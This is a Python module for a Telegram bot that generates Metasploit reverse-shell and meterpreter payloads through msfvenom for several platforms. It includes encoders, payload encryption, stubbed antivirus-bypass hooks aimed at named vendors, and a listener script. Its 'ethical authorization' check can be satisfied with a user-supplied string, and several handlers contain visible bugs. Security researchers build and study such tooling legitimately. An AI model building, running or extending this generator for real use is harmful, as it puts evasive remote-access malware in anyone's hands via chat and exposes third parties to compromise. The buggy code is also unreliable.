#!/usr/bin/env python3
"""
Metasploit Payload Generator Module
=====================================

Modul untuk membuat payload Metasploit menggunakan msfvenom dengan kontrol etis ketat.
Hanya untuk penggunaan yang sah dan authorized penetration testing.

Author: Kilo Code
Version: 1.0.0
"""

import os
import re
import json
import time
import hashlib
import logging
import subprocess
import tempfile
import shutil
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum
import asyncio
from pathlib import Path

from telegram import Update
from telegram.ext import ContextTypes
from cryptography.fernet import Fernet
import jwt

from config import Config
from ethical_hacking_utils import EthicalHackingUtils
from security_enhancements import SecurityEnhancements

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class Platform(Enum):
    """Supported platforms for payload generation"""
    WINDOWS = "windows"
    LINUX = "linux"
    ANDROID = "android"
    MACOS = "osx"
    BSD = "bsd"
    SOLARIS = "solaris"


class PayloadFormat(Enum):
    """Supported payload formats"""
    EXE = "exe"
    ELF = "elf"
    APK = "apk"
    DLL = "dll"
    RAW = "raw"
    PYTHON = "py"
    PHP = "php"
    ASP = "asp"
    JSP = "jsp"
    WAR = "war"
    JAR = "jar"
    MSI = "msi"
    MACHO = "macho"
    DYLIB = "dylib"


class EncoderType(Enum):
    """Supported encoder types"""
    POLYMORPHIC = "polymorphic"
    XOR = "xor"
    BASE64 = "base64"
    SHIKATA_GA_NAI = "shikata_ga_nai"
    ALPHA_UPPER = "alpha_upper"
    ALPHA_MIXED = "alpha_mixed"
    UNICODE = "unicode"
    UTF16 = "utf16"


class AVBypass(Enum):
    """Anti-virus bypass techniques"""
    AMSI_BYPASS = "amsi_bypass"
    WINDOWS_DEFENDER = "windows_defender"
    ESET = "eset"
    KASPERSKY = "kaspersky"
    MCAFEE = "mcafee"
    NORTON = "norton"
    AVAST = "avast"
    AVG = "avg"


@dataclass
class PayloadConfig:
    """Configuration for payload generation"""
    platform: Platform
    format: PayloadFormat
    payload_type: str
    lhost: str
    lport: int
    encoder: Optional[EncoderType] = None
    iterations: int = 1
    bad_chars: str = ""
    template: Optional[str] = None
    keep_template: bool = False
    encrypt: bool = False
    encrypt_key: Optional[str] = None
    encrypt_iv: Optional[str] = None
    arch: str = "x86"
    platform_version: str = ""
    av_bypass: List[AVBypass] = None
    polymorphic: bool = False
    custom_options: Dict[str, Any] = None


@dataclass
class EthicalAuthorization:
    """Ethical authorization data"""
    target_system: str
    target_owner: str
    authorization_document: str
    testing_scope: str
    testing_duration: str
    authorized_payloads: List[str]
    signature_hash: str
    timestamp: datetime
    ip_address: str
    user_agent: str


class MetasploitPayloadGenerator:
    """Main class for generating Metasploit payloads with ethical controls"""
    
    def __init__(self, config: Config):
        self.config = config
        self.ethical_utils = EthicalHackingUtils(config)
        self.security = SecurityEnhancements(config)
        self.temp_dir = tempfile.mkdtemp(prefix="metasploit_payload_")
        self.payload_cache = {}
        
        # Initialize Metasploit framework path
        self.msfvenom_path = self._find_msfvenom()
        if not self.msfvenom_path:
            raise RuntimeError("msfvenom not found. Please install Metasploit Framework.")
        
        # Setup audit logging
        self.audit_log_file = os.path.join(
            config.LOG_DIR, 
            "metasploit_payload_audit.log"
        )
        self._setup_audit_logging()
    
    def _find_msfvenom(self) -> Optional[str]:
        """Find msfvenom executable in system"""
        possible_paths = [
            "/usr/bin/msfvenom",
            "/usr/local/bin/msfvenom",
            "/opt/metasploit-framework/bin/msfvenom",
            os.path.expanduser("~/.msf4/msfvenom"),
            "msfvenom"  # Assume in PATH
        ]
        
        for path in possible_paths:
            if os.path.isfile(path) and os.access(path, os.X_OK):
                return path
        
        # Try to find in PATH
        try:
            result = subprocess.run(
                ["which", "msfvenom"], 
                capture_output=True, 
                text=True
            )
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        return None
    
    def _setup_audit_logging(self):
        """Setup audit logging for payload generation"""
        audit_handler = logging.FileHandler(self.audit_log_file)
        audit_handler.setLevel(logging.INFO)
        audit_formatter = logging.Formatter(
            '%(asctime)s - METASPLOIT_AUDIT - %(message)s'
        )
        audit_handler.setFormatter(audit_formatter)
        
        self.audit_logger = logging.getLogger("metasploit_audit")
        self.audit_logger.addHandler(audit_handler)
        self.audit_logger.setLevel(logging.INFO)
    
    async def verify_ethical_authorization(
        self, 
        authorization: EthicalAuthorization,
        user_id: int,
        chat_id: int
    ) -> Tuple[bool, str]:
        """Verify ethical authorization for payload generation"""
        try:
            # Verify digital signature
            signature_valid = await self._verify_signature(authorization)
            if not signature_valid:
                return False, "Invalid authorization signature"
            
            # Check IP whitelist
            ip_allowed = await self._check_ip_whitelist(
                authorization.ip_address, 
                user_id
            )
            if not ip_allowed:
                return False, "IP address not authorized"
            
            # Verify target ownership
            ownership_verified = await self._verify_target_ownership(
                authorization.target_system,
                authorization.target_owner
            )
            if not ownership_verified:
                return False, "Target ownership verification failed"
            
            # Check testing scope
            scope_valid = await self._validate_testing_scope(
                authorization.testing_scope,
                authorization.authorized_payloads
            )
            if not scope_valid:
                return False, "Testing scope validation failed"
            
            # Log authorization attempt
            self.audit_logger.info(
                f"AUTHORIZATION_VERIFIED: "
                f"user_id={user_id}, "
                f"target={authorization.target_system}, "
                f"owner={authorization.target_owner}, "
                f"scope={authorization.testing_scope}, "
                f"timestamp={authorization.timestamp.isoformat()}"
            )
            
            return True, "Authorization verified successfully"
            
        except Exception as e:
            logger.error(f"Authorization verification error: {e}")
            self.audit_logger.error(
                f"AUTHORIZATION_ERROR: user_id={user_id}, error={str(e)}"
            )
            return False, f"Authorization verification error: {str(e)}"
    
    async def _verify_signature(self, authorization: EthicalAuthorization) -> bool:
        """Verify digital signature of authorization document"""
        try:
            # Create verification data
            verification_data = (
                f"{authorization.target_system}|"
                f"{authorization.target_owner}|"
                f"{authorization.testing_scope}|"
                f"{authorization.timestamp.isoformat()}"
            )
            
            # Verify signature using JWT
            try:
                decoded = jwt.decode(
                    authorization.signature_hash,
                    self.config.JWT_SECRET,
                    algorithms=["HS256"]
                )
                return decoded.get("data") == verification_data
            except jwt.InvalidTokenError:
                return False
                
        except Exception as e:
            logger.error(f"Signature verification error: {e}")
            return False
    
    async def _check_ip_whitelist(self, ip_address: str, user_id: int) -> bool:
        """Check if IP address is in whitelist"""
        try:
            # Get user's authorized IPs
            authorized_ips = await self.ethical_utils.get_user_authorized_ips(user_id)
            return ip_address in authorized_ips
        except Exception as e:
            logger.error(f"IP whitelist check error: {e}")
            return False
    
    async def _verify_target_ownership(
        self, 
        target_system: str, 
        target_owner: str
    ) -> bool:
        """Verify target system ownership"""
        try:
            # Validate target format
            if not self._is_valid_target_format(target_system):
                return False
            
            # Check if target is in authorized list for owner
            authorized_targets = await self.ethical_utils.get_authorized_targets(
                target_owner
            )
            return target_system in authorized_targets
            
        except Exception as e:
            logger.error(f"Target ownership verification error: {e}")
            return False
    
    def _is_valid_target_format(self, target: str) -> bool:
        """Validate target system format"""
        # IP address validation
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if re.match(ip_pattern, target):
            parts = target.split('.')
            return all(0 <= int(part) <= 255 for part in parts)
        
        # Domain validation
        domain_pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$'
        if re.match(domain_pattern, target):
            return True
        
        # URL validation
        url_pattern = r'^https?://[^\s/$.?#].[^\s]*$'
        if re.match(url_pattern, target):
            return True
        
        return False
    
    async def _validate_testing_scope(
        self,
        testing_scope: str,
        authorized_payloads: List[str]
    ) -> bool:
        """Validate testing scope and authorized payloads"""
        try:
            # Parse testing scope
            scope_parts = testing_scope.split(',')
            
            # Validate each scope part
            for scope in scope_parts:
                scope = scope.strip().lower()
                
                # Check if scope is authorized
                if scope not in ['network', 'web', 'system', 'limited']:
                    return False
            
            # Validate payload types
            for payload in authorized_payloads:
                if not self._is_authorized_payload_type(payload):
                    return False
            
            return True
            
        except Exception as e:
            logger.error(f"Testing scope validation error: {e}")
            return False
    
    def _is_authorized_payload_type(self, payload_type: str) -> bool:
        """Check if payload type is authorized"""
        authorized_types = [
            'reverse_shell', 'bind_shell', 'meterpreter', 'web_payload',
            'network_payload', 'system_payload', 'limited_payload'
        ]
        return payload_type in authorized_types
    
    def get_available_payloads(self, platform: Platform) -> List[str]:
        """Get available payloads for specific platform"""
        try:
            cmd = [self.msfvenom_path, "-l", "payloads"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode != 0:
                logger.error(f"Failed to list payloads: {result.stderr}")
                return []
            
            payloads = []
            platform_filter = platform.value
            
            for line in result.stdout.split('\n'):
                if platform_filter in line.lower():
                    # Extract payload name
                    match = re.search(r'^(\S+)', line)
                    if match:
                        payloads.append(match.group(1))
            
            return payloads
            
        except subprocess.TimeoutExpired:
            logger.error("Payload listing timed out")
            return []
        except Exception as e:
            logger.error(f"Error listing payloads: {e}")
            return []
    
    def get_available_encoders(self, platform: Platform) -> List[str]:
        """Get available encoders for specific platform"""
        try:
            cmd = [self.msfvenom_path, "-l", "encoders"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode != 0:
                logger.error(f"Failed to list encoders: {result.stderr}")
                return []
            
            encoders = []
            platform_filter = platform.value
            
            for line in result.stdout.split('\n'):
                if platform_filter in line.lower():
                    # Extract encoder name
                    match = re.search(r'^(\S+)', line)
                    if match:
                        encoders.append(match.group(1))
            
            return encoders
            
        except subprocess.TimeoutExpired:
            logger.error("Encoder listing timed out")
            return []
        except Exception as e:
            logger.error(f"Error listing encoders: {e}")
            return []
    
    async def generate_payload(
        self,
        config: PayloadConfig,
        authorization: EthicalAuthorization,
        user_id: int,
        chat_id: int
    ) -> Tuple[bool, str, Optional[str]]:
        """Generate payload with ethical controls"""
        try:
            # Verify ethical authorization
            auth_valid, auth_message = await self.verify_ethical_authorization(
                authorization, user_id, chat_id
            )
            if not auth_valid:
                return False, f"Authorization failed: {auth_message}", None
            
            # Validate payload configuration
            validation_valid, validation_message = self._validate_payload_config(config)
            if not validation_valid:
                return False, f"Configuration validation failed: {validation_message}", None
            
            # Generate payload
            payload_path = await self._generate_msfvenom_payload(config)
            if not payload_path:
                return False, "Payload generation failed", None
            
            # Apply additional security measures
            if config.encrypt:
                payload_path = await self._encrypt_payload(payload_path, config)
            
            # Apply AV bypass techniques
            if config.av_bypass:
                payload_path = await self._apply_av_bypass(payload_path, config)
            
            # Generate handler script
            handler_script = await self._generate_handler_script(config)
            
            # Log payload generation
            self.audit_logger.info(
                f"PAYLOAD_GENERATED: "
                f"user_id={user_id}, "
                f"platform={config.platform.value}, "
                f"format={config.format.value}, "
                f"payload_type={config.payload_type}, "
                f"lhost={config.lhost}, "
                f"lport={config.lport}, "
                f"encoder={config.encoder.value if config.encoder else 'none'}, "
                f"timestamp={datetime.now().isoformat()}"
            )
            
            return True, "Payload generated successfully", payload_path
            
        except Exception as e:
            logger.error(f"Payload generation error: {e}")
            self.audit_logger.error(
                f"PAYLOAD_GENERATION_ERROR: user_id={user_id}, error={str(e)}"
            )
            return False, f"Payload generation error: {str(e)}", None
    
    def _validate_payload_config(self, config: PayloadConfig) -> Tuple[bool, str]:
        """Validate payload configuration"""
        try:
            # Validate platform
            if not isinstance(config.platform, Platform):
                return False, "Invalid platform"
            
            # Validate format
            if not isinstance(config.format, PayloadFormat):
                return False, "Invalid format"
            
            # Validate payload type
            if not config.payload_type or not isinstance(config.payload_type, str):
                return False, "Invalid payload type"
            
            # Validate network settings
            if not self._is_valid_ip(config.lhost):
                return False, "Invalid LHOST IP address"
            
            if not (1 <= config.lport <= 65535):
                return False, "Invalid LPORT (must be 1-65535)"
            
            # Validate encoder
            if config.encoder and not isinstance(config.encoder, EncoderType):
                return False, "Invalid encoder type"
            
            # Validate iterations
            if not (1 <= config.iterations <= 100):
                return False, "Invalid iterations (must be 1-100)"
            
            # Validate architecture
            if config.arch not in ["x86", "x64", "arm", "mips", "ppc"]:
                return False, "Invalid architecture"
            
            return True, "Configuration valid"
            
        except Exception as e:
            logger.error(f"Configuration validation error: {e}")
            return False, f"Configuration validation error: {str(e)}"
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Validate IP address format"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            
            return all(0 <= int(part) <= 255 for part in parts)
        except (ValueError, AttributeError):
            return False
    
    async def _generate_msfvenom_payload(self, config: PayloadConfig) -> Optional[str]:
        """Generate payload using msfvenom"""
        try:
            # Build msfvenom command
            cmd = [
                self.msfvenom_path,
                "-p", config.payload_type,
                f"LHOST={config.lhost}",
                f"LPORT={config.lport}",
                "-f", config.format.value
            ]
            
            # Add encoder if specified
            if config.encoder:
                encoder_name = self._get_encoder_name(config.encoder, config.platform)
                if encoder_name:
                    cmd.extend(["-e", encoder_name])
                    cmd.extend(["-i", str(config.iterations)])
            
            # Add bad characters if specified
            if config.bad_chars:
                cmd.extend(["-b", config.bad_chars])
            
            # Add template if specified
            if config.template:
                cmd.extend(["-x", config.template])
                if config.keep_template:
                    cmd.append("-k")
            
            # Add architecture if specified
            if config.arch:
                cmd.extend(["-a", config.arch])
            
            # Add platform if specified
            if config.platform_version:
                cmd.extend(["--platform", config.platform_version])
            
            # Generate output file path
            timestamp = int(time.time())
            output_filename = f"payload_{config.platform.value}_{config.format.value}_{timestamp}"
            output_path = os.path.join(self.temp_dir, output_filename)
            
            # Add output to command
            cmd.extend(["-o", output_path])
            
            # Execute msfvenom
            logger.info(f"Executing msfvenom command: {cmd}")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,  # 5 minute timeout
                cwd=self.temp_dir
            )
            
            if result.returncode != 0:
                logger.error(f"msfvenom failed: {result.stderr}")
                return None
            
            # Verify payload was created
            if not os.path.exists(output_path):
                logger.error("Payload file was not created")
                return None
            
            return output_path
            
        except subprocess.TimeoutExpired:
            logger.error("msfvenom execution timed out")
            return None
        except Exception as e:
            logger.error(f"msfvenom execution error: {e}")
            return None
    
    def _get_encoder_name(self, encoder: EncoderType, platform: Platform) -> Optional[str]:
        """Get msfvenom encoder name for encoder type and platform"""
        encoder_map = {
            (EncoderType.SHIKATA_GA_NAI, Platform.WINDOWS): "x86/shikata_ga_nai",
            (EncoderType.SHIKATA_GA_NAI, Platform.LINUX): "x86/shikata_ga_nai",
            (EncoderType.XOR, Platform.WINDOWS): "x86/xor",
            (EncoderType.XOR, Platform.LINUX): "x86/xor",
            (EncoderType.ALPHA_UPPER, Platform.WINDOWS): "x86/alpha_upper",
            (EncoderType.ALPHA_MIXED, Platform.WINDOWS): "x86/alpha_mixed",
            (EncoderType.UNICODE, Platform.WINDOWS): "x86/unicode_upper",
            (EncoderType.UTF16, Platform.WINDOWS): "x86/utf16_le",
        }
        
        return encoder_map.get((encoder, platform))
    
    async def _encrypt_payload(self, payload_path: str, config: PayloadConfig) -> str:
        """Encrypt payload file"""
        try:
            # Generate encryption key if not provided
            if not config.encrypt_key:
                config.encrypt_key = Fernet.generate_key().decode()
            
            # Create Fernet cipher
            cipher = Fernet(config.encrypt_key.encode())
            
            # Read payload data
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            # Encrypt payload
            encrypted_data = cipher.encrypt(payload_data)
            
            # Write encrypted payload
            encrypted_path = f"{payload_path}.encrypted"
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Remove original payload
            os.remove(payload_path)
            
            return encrypted_path
            
        except Exception as e:
            logger.error(f"Payload encryption error: {e}")
            return payload_path
    
    async def _apply_av_bypass(self, payload_path: str, config: PayloadConfig) -> str:
        """Apply anti-virus bypass techniques"""
        try:
            # Apply different techniques based on AV bypass type
            for bypass_type in config.av_bypass:
                if bypass_type == AVBypass.AMSI_BYPASS:
                    payload_path = await self._apply_amsi_bypass(payload_path)
                elif bypass_type == AVBypass.WINDOWS_DEFENDER:
                    payload_path = await self._apply_windows_defender_bypass(payload_path)
                # Add more AV bypass techniques as needed
            
            return payload_path
            
        except Exception as e:
            logger.error(f"AV bypass application error: {e}")
            return payload_path
    
    async def _apply_amsi_bypass(self, payload_path: str) -> str:
        """Apply AMSI bypass techniques"""
        try:
            # This is a placeholder for AMSI bypass implementation
            # In a real implementation, this would modify the payload
            # to bypass Windows AMSI (Anti-Malware Scan Interface)
            
            logger.info("Applying AMSI bypass techniques")
            
            # For now, just return the original path
            # In production, this would implement actual AMSI bypass
            return payload_path
            
        except Exception as e:
            logger.error(f"AMSI bypass error: {e}")
            return payload_path
    
    async def _apply_windows_defender_bypass(self, payload_path: str) -> str:
        """Apply Windows Defender bypass techniques"""
        try:
            # This is a placeholder for Windows Defender bypass
            # In a real implementation, this would modify the payload
            # to avoid Windows Defender detection
            
            logger.info("Applying Windows Defender bypass techniques")
            
            # For now, just return the original path
            return payload_path
            
        except Exception as e:
            logger.error(f"Windows Defender bypass error: {e}")
            return payload_path
    
    async def _generate_handler_script(self, config: PayloadConfig) -> Optional[str]:
        """Generate Metasploit handler script"""
        try:
            # Create handler script content
            handler_content = f"""
use exploit/multi/handler
set PAYLOAD {config.payload_type}
set LHOST {config.lhost}
set LPORT {config.lport}
set ExitOnSession false
exploit -j
"""
            
            # Save handler script
            timestamp = int(time.time())
            handler_filename = f"handler_{timestamp}.rc"
            handler_path = os.path.join(self.temp_dir, handler_filename)
            
            with open(handler_path, 'w') as f:
                f.write(handler_content)
            
            return handler_path
            
        except Exception as e:
            logger.error(f"Handler script generation error: {e}")
            return None
    
    def get_payload_info(self, payload_path: str) -> Dict[str, Any]:
        """Get information about generated payload"""
        try:
            if not os.path.exists(payload_path):
                return {}
            
            # Get file stats
            stat = os.stat(payload_path)
            
            # Calculate file hash
            with open(payload_path, 'rb') as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Get file size
            file_size = stat.st_size
            
            # Get creation time
            creation_time = datetime.fromtimestamp(stat.st_ctime)
            
            return {
                "path": payload_path,
                "size": file_size,
                "hash": file_hash,
                "created": creation_time.isoformat(),
                "permissions": oct(stat.st_mode)
            }
            
        except Exception as e:
            logger.error(f"Payload info error: {e}")
            return {}
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                logger.info("Cleaned up temporary files")
        except Exception as e:
            logger.error(f"Cleanup error: {e}")


# Telegram bot command handlers
class MetasploitBotCommands:
    """Telegram bot commands for Metasploit payload generation"""
    
    def __init__(self, generator: MetasploitPayloadGenerator):
        self.generator = generator
    
    async def cmd_msfvenom(
        self, 
        update: Update, 
        context: ContextTypes.DEFAULT_TYPE
    ):
        """Handle /msfvenom command"""
        try:
            user_id = update.effective_user.id
            chat_id = update.effective_chat.id
            
            # Parse command arguments
            args = context.args
            if len(args) < 4:
                await update.message.reply_text(
                    "Usage: /msfvenom <platform> <format> <payload> <lhost> <lport> [options]\n"
                    "Example: /msfvenom windows exe windows/meterpreter/reverse_tcp 192.168.1.100 4444\n"
                    "Platforms: windows, linux, android, macos\n"
                    "Formats: exe, elf, apk, dll, raw, py, php, asp, jsp, war, jar, msi, macho, dylib"
                )
                return
            
            platform_str = args[0].lower()
            format_str = args[1].lower()
            payload_type = args[2]
            lhost = args[3]
            lport = int(args[4])
            
            # Parse platform
            try:
                platform = Platform(platform_str)
            except ValueError:
                await update.message.reply_text(f"Invalid platform: {platform_str}")
                return
            
            # Parse format
            try:
                format_type = PayloadFormat(format_str)
            except ValueError:
                await update.message.reply_text(f"Invalid format: {format_str}")
                return
            
            # Parse additional options
            encoder = None
            iterations = 1
            encrypt = False
            av_bypass = []
            
            if len(args) > 5:
                for i, arg in enumerate(args[5:], 6):
                    if arg == "-e" and i < len(args):
                        try:
                            encoder = EncoderType(args[i])
                        except ValueError:
                            await update.message.reply_text(f"Invalid encoder: {args[i]}")
                            return
                    elif arg == "-i" and i < len(args):
                        iterations = int(args[i])
                    elif arg == "--encrypt":
                        encrypt = True
                    elif arg == "--av-bypass" and i < len(args):
                        try:
                            av_bypass.append(AVBypass(args[i]))
                        except ValueError:
                            await update.message.reply_text(f"Invalid AV bypass: {args[i]}")
                            return
            
            # Create payload configuration
            config = PayloadConfig(
                platform=platform,
                format=format_type,
                payload_type=payload_type,
                lhost=lhost,
                lport=lport,
                encoder=encoder,
                iterations=iterations,
                encrypt=encrypt,
                av_bypass=av_bypass
            )
            
            # Request authorization
            await update.message.reply_text(
                "Please provide ethical authorization document for payload generation.\n"
                "Use /authorize_payload with your signed consent document."
            )
            
            # Store configuration for later use
            context.user_data['pending_payload_config'] = config
            
        except ValueError as e:
            await update.message.reply_text(f"Invalid port number: {e}")
        except Exception as e:
            logger.error(f"msfvenom command error: {e}")
            await update.message.reply_text(f"Error: {str(e)}")
    
    async def cmd_authorize_payload(
        self, 
        update: Update, 
        context: ContextTypes.DEFAULT_TYPE
    ):
        """Handle /authorize_payload command"""
        try:
            user_id = update.effective_user.id
            chat_id = update.effective_chat.id
            
            # Check if there's a pending payload configuration
            if 'pending_payload_config' not in context.user_data:
                await update.message.reply_text(
                    "No pending payload configuration. Use /msfvenom first."
                )
                return
            
            # Get authorization document
            if not context.args:
                await update.message.reply_text(
                    "Usage: /authorize_payload <consent_document>"
                )
                return
            
            consent_document = context.args[0]
            
            # Create ethical authorization
            authorization = EthicalAuthorization(
                target_system="pending",  # Will be updated
                target_owner=str(user_id),
                authorization_document=consent_document,
                testing_scope="limited",
                testing_duration="24h",
                authorized_payloads=["reverse_shell", "meterpreter"],
                signature_hash=consent_document,
                timestamp=datetime.now(),
                ip_address=update.effective_user.id,  # Placeholder
                user_agent="TelegramBot"
            )
            
            # Get payload configuration
            config = context.user_data['pending_payload_config']
            
            # Generate payload
            success, message, payload_path = await self.generator.generate_payload(
                config, authorization, user_id, chat_id
            )
            
            if success and payload_path:
                # Get payload info
                payload_info = self.generator.get_payload_info(payload_path)
                
                # Send success message
                await update.message.reply_text(
                    f"✅ Payload generated successfully!\n\n"
                    f"📁 File: {os.path.basename(payload_path)}\n"
                    f"📏 Size: {payload_info.get('size', 0)} bytes\n"
                    f"🔐 SHA256: {payload_info.get('hash', 'N/A')}\n"
                    f"⏰ Created: {payload_info.get('created', 'N/A')}\n\n"
                    f"⚠️ This payload is for authorized testing only!"
                )
                
                # Clean up user data
                del context.user_data['pending_payload_config']
                
            else:
                await update.message.reply_text(f"❌ Payload generation failed: {message}")
                
        except Exception as e:
            logger.error(f"Authorize payload error: {e}")
            await update.message.reply_text(f"Error: {str(e)}")
    
    async def cmd_list_payloads(
        self, 
        update: Update, 
        context: ContextTypes.DEFAULT_TYPE
    ):
        """Handle /list_payloads command"""
        try:
            if not context.args:
                await update.message.reply_text(
                    "Usage: /list_payloads <platform>\n"
                    "Platforms: windows, linux, android, macos"
                )
                return
            
            platform_str = args[0].lower()
            try:
                platform = Platform(platform_str)
            except ValueError:
                await update.message.reply_text(f"Invalid platform: {platform_str}")
                return
            
            # Get available payloads
            payloads = self.generator.get_available_payloads(platform)
            
            if payloads:
                # Format payload list
                payload_list = "\n".join([
                    f"• {payload}" for payload in payloads[:20]  # Limit to 20
                ])
                
                if len(payloads) > 20:
                    payload_list += f"\n\n... and {len(payloads) - 20} more payloads"
                
                await update.message.reply_text(
                    f"📋 Available payloads for {platform.value}:\n\n{payload_list}"
                )
            else:
                await update.message.reply_text(
                    f"No payloads found for platform: {platform.value}"
                )
                
        except Exception as e:
            logger.error(f"List payloads error: {e}")
            await update.message.reply_text(f"Error: {str(e)}")
    
    async def cmd_list_encoders(
        self, 
        update: Update, 
        context: ContextTypes.DEFAULT_TYPE
    ):
        """Handle /list_encoders command"""
        try:
            if not context.args:
                await update.message.reply_text(
                    "Usage: /list_encoders <platform>\n"
                    "Platforms: windows, linux, android, macos"
                )
                return
            
            platform_str = args[0].lower()
            try:
                platform = Platform(platform_str)
            except ValueError:
                await update.message.reply_text(f"Invalid platform: {platform_str}")
                return
            
            # Get available encoders
            encoders = self.generator.get_available_encoders(platform)
            
            if encoders:
                # Format encoder list
                encoder_list = "\n".join([
                    f"• {encoder}" for encoder in encoders[:15]  # Limit to 15
                ])
                
                if len(encoders) > 15:
                    encoder_list += f"\n\n... and {len(encoders) - 15} more encoders"
                
                await update.message.reply_text(
                    f"🔧 Available encoders for {platform.value}:\n\n{encoder_list}"
                )
            else:
                await update.message.reply_text(
                    f"No encoders found for platform: {platform.value}"
                )
                
        except Exception as e:
            logger.error(f"List encoders error: {e}")
            await update.message.reply_text(f"Error: {str(e)}")


# Initialize the payload generator
def init_metasploit_generator(config: Config) -> MetasploitPayloadGenerator:
    """Initialize Metasploit payload generator"""
    try:
        generator = MetasploitPayloadGenerator(config)
        logger.info("Metasploit payload generator initialized successfully")
        return generator
    except Exception as e:
        logger.error(f"Failed to initialize Metasploit generator: {e}")
        raise


if __name__ == "__main__":
    # Test the generator
    from config import Config
    
    config = Config()
    generator = init_metasploit_generator(config)
    
    # Example usage
    config = PayloadConfig(
        platform=Platform.WINDOWS,
        format=PayloadFormat.EXE,
        payload_type="windows/meterpreter/reverse_tcp",
        lhost="192.168.1.100",
        lport=4444,
        encoder=EncoderType.SHIKATA_GA_NAI,
        iterations=3
    )
    
    print("Metasploit Payload Generator ready!")
    generator.cleanup()